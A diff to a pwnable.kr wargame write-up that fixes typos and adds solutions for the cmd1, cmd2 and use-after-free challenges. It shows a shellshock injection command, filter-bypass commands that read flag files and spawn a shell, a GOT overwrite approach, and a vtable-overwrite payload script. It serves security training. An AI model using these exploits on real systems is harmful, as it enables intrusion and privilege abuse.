@@ -39,7 +39,7 @@ int main(int argc, char* argv[], char* envp[]){
 }
 ``` 
 
-If argv[1] is set as 4660 (0x1234), the variable fd will be 0, which is the standard input. And then, we just got the flag when we input `LETMEWIN` on the screen.
+If argv[1] is set as 4660 (0x1234), the variable `fd` will be 0, which is the standard input. And then, we just got the flag when we input `LETMEWIN` on the screen.
 
 -
 
@@ -119,7 +119,7 @@ Then this command will show us the flag.
 
 ### bof
 
-This is a basic buffer overflow task, but the difficulty may be existed in comunication to the server. If you receive the following message
+This is a basic buffer overflow task, but the difficulty may be existed in communication to the server. If you receive the following message
 
 `*** stack smashing detected ***: /home/bof/bof terminated`
 
@@ -167,7 +167,7 @@ OUT=PRE+SIGN
 print(OUT)
 ```
 
-It maybe a little bit difficult to calaculate the distant between the address of `key` and the address of `overflowme`. The easies way is to differ two address of them in GDB. The distant is 0x34 in this case.
+It maybe a little bit difficult to calculate the distant between the address of `key` and the address of `overflowme`. The easies way is to differ two address of them in GDB. The distant is 0x34 in this case.
 
 The flag is followed.
 
@@ -186,7 +186,7 @@ The output on the screen inspired me.
 
 `I will malloc() and strcpy the flag there. take it.`
 
-There are two ideas in my mind. One is to trace the address of the buffer, whihc is allocated by malloc(). The other is to set breakpoint at libc function strcpy and then monitor the content of parameters. I chose the later one.
+There are two ideas in my mind. One is to trace the address of the buffer, which is allocated by malloc(). The other is to set breakpoint at libc function strcpy and then monitor the content of parameters. I chose the later one.
 
 This is my gdb init file.
 
@@ -219,7 +219,7 @@ The flag is.
 
 ### passcode
 
-A very common mistake is fogetting the address symbol & , when a address is needed.
+A very common mistake is forgetting the address symbol & , when a address is needed.
 
 The vulnerable source code is followed.
 
@@ -272,7 +272,7 @@ int main(){
 
 The parameters for the function scanf() should be address, not the value. However, if you insist pass a value to the scanf(), it will be considered as a address.
 
-If we can control the content of the variable passcode1 and passcode2, we will get the flag. The first idea is manipulate the content of the string name[100]. The content of the stack will not be cleaned when the current function is returned. The content in the stack will be reused by the next calling function, which is login() in this case. However, we can only manipulate the initial value of the passcode1, since the variable layout of the stack. The good news is the initial value of the variable passcode1 will be used as a address for the function scanf(). Based on this vulnerability, we can overwrite an 4 byte memory, where the flag is marked as writeable. GOT PLT exploitation technique will be very helpfull in this situation. We can overwrite the PLT record of the function exit() to the value 0x80485d7, which is the address of the login ok logic.
+If we can control the content of the variable passcode1 and passcode2, we will get the flag. The first idea is manipulate the content of the string name[100]. The content of the stack will not be cleaned when the current function is returned. The content in the stack will be reused by the next calling function, which is login() in this case. However, we can only manipulate the initial value of the passcode1, since the variable layout of the stack. The good news is the initial value of the variable passcode1 will be used as a address for the function scanf(). Based on this vulnerability, we can overwrite an 4 byte memory, where the flag is marked as writeable. GOT PLT exploitation technique will be very helpful in this situation. We can overwrite the PLT record of the function exit() to the value 0x80485d7, which is the address of the login ok logic.
 
 The content of ex.py is:
 
@@ -300,7 +300,7 @@ Then we use `python /tmp/ex.py | ./passcode` to escape the login check function.
 
 ### random
 
-It is a vulnerability that using rand() without initialisint the seed firstly.
+It is a vulnerability that using rand() without initialising the seed firstly.
 
 The vulnerable source code is:
 
@@ -339,7 +339,7 @@ The key will be 1804289383 xor 0xdeadbeef, which is
 
 This task is mainly to train the ability to communicate the testing server.
 
-Linux programming knowledges,such as pipe ,fork, execve and socket, are necessary.
+Linux programming knowledges,such as `pipe` ,`fork`, `execve` and `socket`, are necessary.
 
 The source code is followed.
 
@@ -505,7 +505,7 @@ int main(){
 }
 ```
 
-Compile the source code into binary and then scp the binary to the server side by command `scp -P 2222 ./exploit  input@pwnable.kr:/tmp/`. The flag is followed after execution through `/tmp/exploit`.
+Compile the source code into binary and then `scp` the binary to the server side by command `scp -P 2222 ./exploit  input@pwnable.kr:/tmp/`. The flag is followed after execution through `/tmp/exploit`.
 
 -
 `Mommy! I learned how to pass various input in Linux :)`
@@ -592,7 +592,7 @@ The flag is:
 
 ### shellshock
 
-The shellshock is a command injection vulnerability which could be conduct through manipulating environment variables in shell.
+The `shellshock` is a command injection vulnerability which could be conduct through manipulating environment variables in shell.
 
 I tried the command `env x='() { :;}; /bin/cat flag' ./shellshock `, then got the flag.
 
@@ -689,7 +689,7 @@ The flag is:
 -
 
 ### blackjack
-The vulnerability of the source code is about semantic check. the bet checking will be failed at the second times. And user can also input a negtive number, then magic will happen when you lose a game. This vulnerability is found by my lovely wife.
+The vulnerability of the source code is about semantic check. the bet checking will be failed at the second times. And user can also input a negative number, then magic will happen when you lose a game. This vulnerability is found by my lovely wife.
 
 The source code is followed.
 
@@ -732,9 +732,9 @@ for(i=0; i<6; i++){
 }
 ```
 
-It is high probable that a submit[j] is equal to any of the characher of lotto[].
+It is high probable that a submit[j] is equal to any of the character of lotto[].
 
-This is my sulotion.
+This is my solution.
 
 ```
 #!/usr/bin/env python
@@ -753,7 +753,226 @@ The flag is.
 
 -
 
+### cmd1
+The environment variables, such as PATH and HOME, can be overwritten by `/bin/env`.
 
+The vulnerable source code is attached.
+
+```
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+	int r=0;
+	r += strstr(cmd, "flag")!=0;
+	r += strstr(cmd, "sh")!=0;
+	r += strstr(cmd, "tmp")!=0;
+	return r;
+}
+int main(int argc, char* argv[], char** envp){
+	putenv("PATH=/fuckyouverymuch");
+	if(filter(argv[1])) return 0;
+	system( argv[1] );
+	return 0;
+}
+```
+Soft link can be used to bypass string filter.
+
+Following commands will print the content of the flag.
+
+```
+cd /tmp
+ln -s /home/cmd1/flag x
+/home/cmd1/cmd1 '/usr/bin/env PATH=. /bin/cat x'
+```
+
+-
+`mommy now I get what PATH environment is for :)`
+
+-
+
+### cmd2
+The filter is stronger in this problem.
+
+```
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+	int r=0;
+	r += strstr(cmd, "/")!=0;
+	r += strstr(cmd, "`")!=0;
+	r += strstr(cmd, "flag")!=0;
+	return r;
+}
+
+extern char** environ;
+void delete_env(){
+	char** p;
+	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
+}
+
+int main(int argc, char* argv[], char** envp){
+	delete_env();
+	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
+	if(filter(argv[1])) return 0;
+	printf("%s\n", argv[1]);
+	system( argv[1] );
+	return 0;
+}
+
+```
+
+My solution is.
+
+```
+cd /bin
+/home/cmd2/cmd2 ' PATH=. sh '
+cat /home/cmd2/flag
+```
+
+The flag is.
+
+-
+`FuN_w1th_5h3ll_v4riabl3s_haha`
+
+-
+
+### uaf
+The Use After Free (UAF) is a vulnerability that causes a program to crash, use unexpected value and even execution code.
+
+the vulnerable source code is followed.
+
+```
+#include <fcntl.h>
+#include <iostream> 
+#include <cstring>
+#include <cstdlib>
+#include <unistd.h>
+using namespace std;
+
+class Human{
+private:
+	virtual void give_shell(){
+		system("/bin/sh");
+	}
+protected:
+	int age;
+	string name;
+public:
+	virtual void introduce(){
+		cout << "My name is " << name << endl;
+		cout << "I am " << age << " years old" << endl;
+	}
+};
+
+class Man: public Human{
+public:
+	Man(string name, int age){
+		this->name = name;
+		this->age = age;
+        }
+        virtual void introduce(){
+		Human::introduce();
+                cout << "I am a nice guy!" << endl;
+        }
+};
+
+class Woman: public Human{
+public:
+        Woman(string name, int age){
+                this->name = name;
+                this->age = age;
+        }
+        virtual void introduce(){
+                Human::introduce();
+                cout << "I am a cute girl!" << endl;
+        }
+};
+
+int main(int argc, char* argv[]){
+	Human* m = new Man("Jack", 25);
+	Human* w = new Woman("Jill", 21);
+
+	size_t len;
+	char* data;
+	unsigned int op;
+	while(1){
+		cout << "1. use\n2. after\n3. free\n";
+		cin >> op;
+
+		switch(op){
+			case 1:
+				m->introduce();
+				w->introduce();
+				break;
+			case 2:
+				len = atoi(argv[1]);
+				data = new char[len];
+				read(open(argv[2], O_RDONLY), data, len);
+				cout << "your data is allocated" << endl;
+				break;
+			case 3:
+				delete m;
+				delete w;
+				break;
+			default:
+				break;
+		}
+	}
+
+	return 0;	
+}
+```
+
+There are three stages in the UAF vulnerability exploit. The first one is to use. In this task, two objects is allocated by new operator. Then in Case 3, these two pointer is deleted, which means the memory allocated before are returned to the memory allocator. However, the value of pointers are not cleared. The piece of memory will be reallocated in Case 2, which means the content of memory is manipulated by user input. Finally, in Case 1 `m->introduce()` is a function call, the address of the function is in the Vtable of the object. If we can manipulate the content of the Vtable, we can lead the execution flow to the function `give_shell()`.
+
+Following gcc command will show the class structs.
+
+```
+g++ -fdump-class-hierarchy uaf.cpp
+cat uaf.cpp.002t.class | c++filt
+```
+
+The following python code is to construct the Vtable.
+
+```
+#!/usr/bin/env python
+
+import sys
+
+val="\x68\x15\x40\x00\x00\x00\x00\x00"*3
+sys.stdout.write(val)
+sys.stdout.flush()
+```
+
+The shell command is.
+
+```
+python /tmp/ex.py > /tmp/x
+./uaf 24 /tmp/x
+```
+
+Then the input sequence is 3,2,2,2,2,2,1
+
+My gdb init script is followed.
+
+```
+info file
+display/i $pc
+break main
+set follow-fork-mode child
+run 24 heap.dat < input.dat  
+```
+
+The flag is.
+
+-
+`yay_f1ag_aft3r_pwning`
+
+-
 ## Conclusion
+In conclusion, problems in this level is basic. We learned the communication skills and realised basic algorithm is necessary. Some problems also need creative thinking. Two typical vulnerabilities, which are shellshock(CVE-2014-6271) and user after free (CWE-416) deserve to be researched carefully.
 ## References
 1. [rk700](http://rk700.github.io/tags.html#pwnable.kr-ref)
+2. [CWE-416: Use After Free](https://cwe.mitre.org/data/definitions/416.html)
